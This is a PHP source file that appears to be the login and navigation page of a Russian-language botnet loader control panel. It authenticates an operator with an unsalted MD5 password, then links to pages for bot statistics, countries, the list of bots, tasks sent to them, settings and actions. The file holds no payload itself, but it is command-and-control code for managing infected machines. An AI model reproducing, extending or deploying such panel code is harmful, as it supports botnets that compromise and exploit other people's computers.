<?php

error_reporting(0);

define('GRANTED', true);

session_start();

include '../include/config.php';

if ($_SESSION['ldr_login']!=$login or $_SESSION['ldr_passw']!=$passw or $_GET['act']=='exit') {
	unset($_SESSION['ldr_login']);
	unset($_SESSION['ldr_passw']);
}

if ($_POST['login'] and $_POST['passw']) {
	if ($_POST['login']==$login and md5($_POST['passw'])==$passw) {
		$_SESSION['ldr_login'] = $login;
		$_SESSION['ldr_passw'] = $passw;
	}
}

if (!$_SESSION['ldr_login'] or !$_SESSION['ldr_passw']) {
	include 'header.php';
	echo '<table width=100% height=80%>
<tr>
	<td align=center>
	<table width=200 class=table>
	<tr>
		<td colspan=2><table width=100% class=table1 cellpadding=0>
		<tr><td align=center>Авторизуйтесь</td></tr>
		</table></td>
	</tr>
	<form method=post action="./">
	<tr>
		<td align=center width=70>Логин:</td>
		<td align=right width=130><input type=text maxlength=12 name="login" class=text></td>
	</tr>
	<tr>
		<td align=center>Пароль:</td>
		<td align=right><input type=password maxlength=12 name="passw" class=text></td>
	</tr>
	<tr><td align=right colspan=2><input type="submit" value="Войти" class=button></td></tr>
	</form>
	</table>
	</td>
</tr>
</table>';
	include 'footer.php';
	die;
}

include '../include/titles.php';
if ($_GET['act']) include 'actions.php';

include 'header.php';
$style = 'style="background:#000000;color:#C9D9CE;" ';
echo '<table align=center width=900 class=table style="border:1px solid #425B6A;margin-bottom:5px;">
<tr>
	<td align=center class=menu>
		<a href="javascript:window.location.reload(false);">Обновить</a><a '.(($_GET['page']=='')?($style):('')).'href="./">Статистика</a><a '.(($_GET['page']=='countr')?($style):('')).'href="?page=countr">Страны</a><a '.(($_GET['page']=='bots')?($style):('')).'href="?page=bots">Боты</a><a '.(($_GET['page']=='orders')?($style):('')).'href="?page=orders">Задания</a><a '.(($_GET['page']=='options')?($style):('')).'href="?page=options">Настройки</a><a '.(($_GET['page']=='deistv')?($style):('')).'href="?page=deistv">Действия</a><a href="?act=exit">Выход</a> 
	</td>
</tr>
</table>';

switch($_GET['page']) {

	case 'countr':
		include('countr.php');
	break;

	case 'bots':
		include('bots.php');
	break;

	case 'orders':
		include('orders.php');
	break;

	case 'options':
		include('options.php');
	break;

	case 'deistv':
		include('deistv.php');
	break;

	default:
		include('stats.php');
	break;

}

include 'footer.php';

?>
